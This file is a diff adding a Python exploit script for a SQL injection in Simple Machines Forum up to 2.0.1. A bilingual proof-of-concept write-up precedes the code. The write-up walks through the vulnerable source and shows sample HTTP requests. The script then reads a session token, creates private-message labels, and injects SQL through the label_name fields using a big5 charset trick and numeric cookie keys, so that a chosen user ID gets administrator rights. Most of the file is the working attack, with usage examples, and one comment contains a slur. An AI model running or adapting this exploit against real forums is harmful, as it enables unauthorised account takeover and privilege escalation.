@@ -1,0 +1,345 @@
+#!/usr/bin/python
+# -*- coding: iso-8859-15 -*-
+#
+#
+# Exploit Title:		Smf <= 2.0.1 Sql injection Vulnerability
+# Author:			The:Paradox
+# Disclosure date: 	06/12/2011
+# Software Link:	http://download.simplemachines.org/ , http://www.php.net/releases/
+#
+#
+# Smf <= 2.0.1 Sql injection Vulnerability
+#	- Priviledge escalation exploit
+#
+# INTRO:
+#
+#
+# ------- ENGLISH -------
+#
+# Just disclosing all old/useless stuff on my hard drive.
+#
+# Nice vulnerability but too much target requirements: PHP5 < 5.1.4 or PHP4 < 4.4.3 (php Zend_Hash_Del_Key_Or_Index vulnerability affected version)
+# Successfully tested on PHP versions < 5.1.4
+#
+# This exploit was written for version 1.1.5, updated to 1.1.11. I checked some sources, I bet it's actually working on all versions (last version is 2.0.1)
+# Note: PHP4 calculed hash seems to be wrong, somehow can't get correct Zend_Hash_Del_Key_Or_Index Vulnerability hash, whatever. 
+#
+#
+#
+# ------- ITALIANO -------
+#
+# Pubblicando tutto cio' che è diventato inutile o troppo vecchio che ho sul mio disco rigido.
+#
+# Vulnerabilità davvero intricata e carina, ma i target possibili effettivi sono davvero pochi visti i requirements:  PHP5 < 5.1.4 or PHP4 < 4.4.3 (php Zend_Hash_Del_Key_Or_Index vulnerability)
+#
+# Questa vulnerabilità esiste perchè nella realtà dei fatti i programmatori di smf non hanno mai ben compreso la mia precedente advisory, 
+# e fixando un po' alla meno peggio hanno mandato in conflitto due filtri di diverso tipo.
+# E' davvero divertente vedere come la supponenza dei programmatori di smf sia arrivata a commentare in modo da indicarmi esattamente
+# dove cercare la vulnerabilità. Commento testuale: <<Numeric keys in cookies are less of a problem. Just unset those>>, ed è proprio per questo "diverso
+# trattamento" (chissà perchè poi) che la vulnerabilità esiste.
+#
+# L'exploit è stato scritto per 1.1.5 e precedenti, riadattato alla 1.1.11, e, attualmente, dando un'occhiata ai sorgenti, sono pronto a scommettere che funziona su
+# tutte le versioni attuali (2.0.1 è l'ultima al momento del rilascio).
+#
+# Il poc qui sotto è scritto in un inglese cacofonico e altamente comprensibile ad un italiano, credo che fare una traduzione sia davvero superfluo, spero di non creare problemi
+# di comprensione perchè questo exploit è davvero a solo "Educational Purpose" visto che cercare versioni php così vecchie che montino smf è come cercare un
+# ago in un pagliaio.
+#
+# Per motivi che non comprendo, l'hash php4 di Zend_Hash_Del_Key_Or_Index Vulnerability non è corretto e non sono riuscito a generarlo, correggetelo nel caso vogliate testare su php4.
+# Testata con successo sulle versioni vulnerabili di php5
+#
+#
+""" 
+<POC>
+
+Smf <= 1.1.11 Sql injection Vulnerability
+	- Priviledge escalation exploit
+
+			// The:Paradox 
+
+I said in my last smf advisory that 1.1.5 version was safe from
+sql code injections affecting the previous version.
+Now here we are to show how that's not really true.
+The "patch code" (File index.php, lines 45-48) is useless in PHP 5 version < 5.1.4
+and PHP 4 version < 4.4.3
+
+First, let's see some source code:
+
+
+File: index.php 
+----------------------------------------------------------
+
+45.	// Make sure some things simply do not exist.
+46.	foreach (array('db_character_set') as $variable)
+47.		if (isset($GLOBALS[$variable]))
+48.			unset($GLOBALS[$variable]);
+49.	
+50.	// Load the settings...
+51.	require_once(dirname(__FILE__) . '/Settings.php');
+52.	
+53.	// And important includes.
+54.	require_once($sourcedir . '/QueryString.php');
+55.	require_once($sourcedir . '/Subs.php');
+56.	require_once($sourcedir . '/Errors.php');
+57.	require_once($sourcedir . '/Load.php');
+58.	require_once($sourcedir . '/Security.php');
+[...]
+78.	// Load the settings from the settings table, and perform operations like optimizing.
+79.	reloadSettings();
+80.	// Clean the request variables, add slashes, etc.
+81.	cleanRequest();
+
+----------------------------------------------------------
+
+File: Sources/Load.php
+----------------------------------------------------------
+
+138.	function reloadSettings()
+139.	{
+140.		global $modSettings, $db_prefix, $boarddir, $func, $txt, $db_character_set;
+141.		global $mysql_set_mode, $context;
+142.	
+143.		// This makes it possible to have SMF automatically change the sql_mode and autocommit if needed.
+144.		if (isset($mysql_set_mode) && $mysql_set_mode === true)
+145.			db_query("SET sql_mode='', AUTOCOMMIT=1", false, false);
+146.
+147.		// Most database systems have not set UTF-8 as their default input charset.
+148.		if (isset($db_character_set) && preg_match('~^\\w+$~', $db_character_set) === 1)
+149.			db_query("
+150.				SET NAMES $db_character_set", __FILE__, __LINE__);
+
+----------------------------------------------------------
+
+File: Sources/QueryString.php
+----------------------------------------------------------
+
+83.	function cleanRequest()
+84.	{
+85.		global $board, $topic, $boardurl, $scripturl, $modSettings;
+86.	
+87.		// Makes it easier to refer to things this way.
+88.		$scripturl = $boardurl . '/index.php';
+89.	
+90.		// Save some memory.. (since we don't use these anyway.)
+91.		unset($GLOBALS['HTTP_POST_VARS'], $GLOBALS['HTTP_POST_VARS']);
+92.		unset($GLOBALS['HTTP_POST_FILES'], $GLOBALS['HTTP_POST_FILES']);
+93.	
+94.		// These keys shouldn't be set...ever.
+95.		if (isset($_REQUEST['GLOBALS']) || isset($_COOKIE['GLOBALS']))
+96.			die('Invalid request variable.');
+97.	
+98.		// Same goes for numeric keys.
+99.		foreach (array_merge(array_keys($_POST), array_keys($_GET), array_keys($_FILES)) as $key)
+100.			if (is_numeric($key))
+101.				die('Invalid request variable.');
+102.	
+103.		// Numeric keys in cookies are less of a problem. Just unset those.
+104.		foreach ($_COOKIE as $key => $value)
+105.			if (is_numeric($key))
+106.				unset($_COOKIE[$key]);
+----------------------------------------------------------
+
+Now, focus on the db_character_set patch code (lines 45-48, index.php). 
+Unset() function is called, and is well known that it is pretty vulnerable in old php versions (see: Stefan Esser's Zend_hash_del_key_or_index vulnerability).
+
+Whatever smf authors are not imprudent coders and they perfectly know what that means.
+In fact in cleanRequest() function the script dies (line 99-101, Sources/QueryString.php) if any numeric variable in Post, Get or Files arrays was set.
+
+Focus on the index.php.
+Do you see anything vulnerable?
+
+The "ZHDKOI patch" is called after the "db_character_set patch" is executed.
+
+Let's have a try?
+
+-------------------------
+
+PHP version: 5.0.2
+Smf version: 1.1.6
+
+Request 1: 
+	
+>>>	GET	/smf/?db_character_set=1 
+	Host:	localhost	
+	
+<<<	All works regularly.
+
+Request 2: 
+
+>>>	GET	/smf/?db_character_set=1&1102461922=1
+	Host:	localhost	
+
+<<<	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1' at line 1
+
+---------------------
+
+At this point, we have another problem. Even if we have successfully bypassed the db_character_set patch,
+the script will die as soon as cleanRequest() is called, because our numeric variable was unset in GLOBALS array but not in GET one.
+
+In fact if we try to give a valid value to db_character_set...
+
+---------------------
+
+Request 3:
+
+>>>	GET	/smf/?db_character_set=big5&1102461922=1
+	Host:	localhost	
+
+<<<	Invalid request variable.
+
+---------------------
+
+The script will die (l. 101, QueryString.php)
+
+Whatever, as the comment at line 103 (QueryString.php) says, platform's authors had judged that "Numeric keys in cookies are less of a problem" and to "just unset those".
+
+Therefore if we set our numeric variable in COOKIE array, we'll successfully bypass the patch and the script will execute without exiting.
+
+Let's try it:
+
+---------------------
+
+Request 4:
+
+>>>	GET 	/smf/?db_character_set=1
+	Host:	localhost	
+	Cookie: 1102461922=1;
+	
+<<<	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1' at line 1
+
+Request 5:
+
+>>>	GET	/smf/?db_character_set=big5
+	Host:	localhost
+	Cookie: 1102461922=1;
+	
+<<<	All works regularly.
+
+---------------------
+
+In short, the vulnerability exists because "ZHDKOI vulnerability checks" are done only AFTER the patch code is executed.
+
+At this point, as showed in the previous advisory, a big percentage of sql queries are vulnerable making sql code injection possible.
+
+Have fun =D
+
+Discovered:	about 1 week after SMF 1.1.5 release
+
+</POC> 
+"""
+
+from sys import argv, exit
+from httplib import HTTPConnection
+from urllib import urlencode, unquote
+from time import sleep
+print """
+#=================================================================#
+#                   Simple Machines Forum <= 1.1.4                #
+#                    Sql Injection Vulnerability                  #
+#                   Priviledge Escalation Exploit                 #
+#                                                                 #
+#             Adapted to work either for 2.0.1 and below          #
+#                                                                 #
+#                   Spongebob approved this exploit               #
+#                                                                 #
+#                      .--..--..--..--..--..--.                   #
+#                    .' \  (`._   (_)     _   \                   #
+#                  .'    |  '._)         (_)  |                   #
+#                  \ _.')\      .----..---.   /                   #
+#                  |(_.'  |    /    .-\-.  \  |                   #
+#                  \     0|    |   ( O| O) | o|                   #
+#                   |  _  |  .--.____.'._.-.  |                   #
+#                   \ (_) | o         -` .-`  |                   #
+#                    |    \   |`-._ _ _ _ _\ /                    #
+#                    \    |   |  `. |_||_|   |                    #
+#                    | o  |    \_      \     |     -.   .-.       #
+#                    |.-.  \     `--..-'   O |     `.`-' .'       #
+#                  _.'  .' |     `-.-'      /-.__   ' .-'         #
+#                .' `-.` '.|='=.='=.='=.='=|._/_ `-'.'            #
+#                `-._  `.  |________/\_____|    `-.'              #
+#                   .'   ).| '=' '='\/ '=' |                      #
+#                   `._.`  '---------------'                      #
+#                           //___\   //___\                       #
+#                             ||       ||                         #
+#                             ||_.-.   ||_.-.                     #
+#                            (_.--__) (_.--__)                    #
+#                                                                 #
+#====================================#============================#
+# Server Configuration Requirements  #                            #
+#====================================#                            #
+# SMF <= 1.1.4                               register_globals = 1 #
+#                                                                 #
+# 1.1.4 < SMF <= 1.1.11                      register_globals = 1 #
+#                                    PHP5 < 5.1.4 or PHP4 < 4.4.3 #
+#=================================================================#
+# Usage:                                                          #
+#  ./Exploit [Target] [Path] [PHPSessID] [Userid]                 #
+#                                                                 #
+# Example:                                                        #
+#  ./Exploit 127.0.0.1 /SMF/ a574bfe34d95074dea69c00e38851722 9   #
+#  ./Exploit www.host.com / 11efb3b6031bc79a8dd7526750c42119 36   #
+#=================================================================#
+# email: wegotyourbox[at]gmail[dot]com                The:Paradox #
+#=================================================================#
+# POC inside:				 PLEASE -READ- before use #
+#=================================================================#
+
+""" 
+# just answering someone: PHPSESSID IS "YOUR" LOGIN COOKIE FAGS
+# Thanks LGB for ascii art
+
+if len(argv) <= 4: exit()
+
+
+sn = "PHPSESSID" # Session cookie name. You may have to change this.
+port = 80
+
+target = argv[1]
+path = argv[2]
+sv = argv[3]
+uid = argv[4]
+
+
+class killsmf:
+	
+	def __init__(self):
+		
+		print "[.] Exploit Starts."
+	
+		self.GetSesc()
+		self.CreateLabels()
+		self.Inject() 
+	
+		print "[+] All done.\n Now user with ID_MEMBER " + uid + " should have administrator rights. \n -= Paradox Got This One =-"
+	
+	def GetSesc(self):
+		
+		print "[+] Trying to read Sesc"	
+	
+		for i in range (0,2): 
+				conn = HTTPConnection(target,port)
+				conn.request("GET", path + "index.php?action=pm;sa=manlabels;", {}, {"Accept": "text/plain","Cookie": sn + "=" + sv + ";"})
+				rsp = conn.getresponse()
+				r = rsp.read()
+
+		if rsp.status == 404: 
+				exit ("[-] Error 404. Not Found")
+		elif r.find('<input type="hidden" name="sc" value="') != -1 and r.find('" />') != -1 : 
+				self.sesc = r.split('<input type="hidden" name="sc" value="')[1].split('" />')[0] 
+				if len(self.sesc) != 32: exit ("[-] Invalid Sesc")
+				print "[+] Sesc has been successfully read ==> "+self.sesc 
+		else: 
+				exit ("[-] Unable to find Sesc")
+
+	def CreateLabels(self):
+		print "[+] Creating three labels..."
+		for i in range (0,3): 
+				conn = HTTPConnection(target,port)
+				conn.request("POST", path + "index.php?action=pm;sa=manlabels;sesc="+self.sesc, urlencode({"label" : i, "add" : "Add+New+Label"}), {"Accept": "text/plain","Content-type": "application/x-www-form-urlencoded","Referer": "http://" + target + path + "/index.php?action=pm;sa=manlabels", "Cookie": sn + "=" + sv + ";"})
+				sleep(4)
+	def Inject(self):
+		print "[+] Sql code is going to be injected."
+		conn = HTTPConnection(target,port)
+		conn.request("POST", path + "index.php?debug;action=pm;sa=manlabels;sesc="+self.sesc, urlencode({"label_name[0]" : "o rly" + unquote("%a3%27"),"label_name[1]" : "ID_GROUP=1 WHERE/*", "label_name[2]" : "*/ID_MEMBER=" + uid + "/*", "save" : "Save", "sc" : self.sesc, "db_character_set": "big5"}), {"Accept": "text/plain","Content-type": "application/x-www-form-urlencoded","Referer": "http://" + target + path + "/index.php?action=pm;sa=manlabels", "Cookie": sn + "=" + sv + "; 1102461922=1; -1283274824=1;"})
+
+killsmf()	
